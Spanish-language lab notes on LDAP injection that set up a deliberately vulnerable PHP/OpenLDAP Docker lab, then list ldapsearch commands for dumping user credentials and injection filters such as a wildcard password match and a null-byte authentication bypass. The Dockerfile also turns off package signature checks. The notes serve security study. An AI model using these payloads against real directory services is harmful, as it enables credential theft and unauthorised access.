>El **protocolo LDAP** es muy utilizado actualmente por empresa que apuestan por el software libre al utilizar distribuciones de Linux para ejercer las funciones propias de un directorio activo en el que se gestionarán las credenciales y permisos de los trabajadores y estaciones de trabajo en redes LAN corporativas en conexiones cliente/servidor. 

- [Web para saber mas](https://www.profesionalreview.com/2019/01/05/ldap/)
- Corre por el **puerto 389**
 
## Laboratorio
- [Link del repo](https://github.com/motikan2010/LDAP-Injection-Vuln-App)
- Hay que modificar el Dockerfile a:
```
FROM php:7.0-apache

RUN \
    echo "deb http://archive.debian.org/debian stretch main" > /etc/apt/sources.list && \
    echo "deb http://archive.debian.org/debian-security stretch/updates main" >> /etc/apt/sources.list && \
    apt-get update -o Acquire::Check-Valid-Until=false && \
    apt-get install libldap2-dev -y --allow-unauthenticated && \
    rm -rf /var/lib/apt/lists/* && \
    docker-php-ext-configure ldap --with-libdir=lib/x86_64-linux-gnu/ && \
    docker-php-ext-install ldap

ADD ./src/public /var/www/html/
```
- Comandos a ejecutar luego de clonarnos el proyecto:
```bash
docker run -p 389:389 --name openldap-container --detach osixia/openldap:1.2.2
docker build -t ldap-client-container .
docker run --link openldap-container -p 8888:80 ldap-client-container
```
- Podemos acceder a la web desde `localhost:8888`

## Explotacion
```
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```
- `-b` base de busqueda o dominio de busqueda, que en este caso seria example.org que se separa de esa forma `dc=example,dc=org`
- `-D` distinguised name o nombre distinguido, aca le mostramos cual es el nombre que queremos apuntar `cn=admin` common name admin y bajo el dominio `example.org`
- `-w` indicamos la contasenia
- `'cn=admin'` es nuestro criterio de busqueda, donde estamos averiguando informacion sobre un usuario admin, pero podrian ir otras cosas.
```
(&(cn=admin)(description=LDAP*))
(|(cn=admin)(description=LDAP*))
(&(cn=admin)(password=*))
(&(cn=admin))%00)(password=hola))
```
- Y con ese comando obtenemos las credenciales para admin, si quitamos la ultima parte
```
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin
```
- Obtendriamos las credenciales de todos los usuarios

- Podemos interceptar la peticion con Burpsuite y cambiar el payload, ir descubriendo letra por letra, etc.

## Creamos mas usuarios
- Dentro del servidor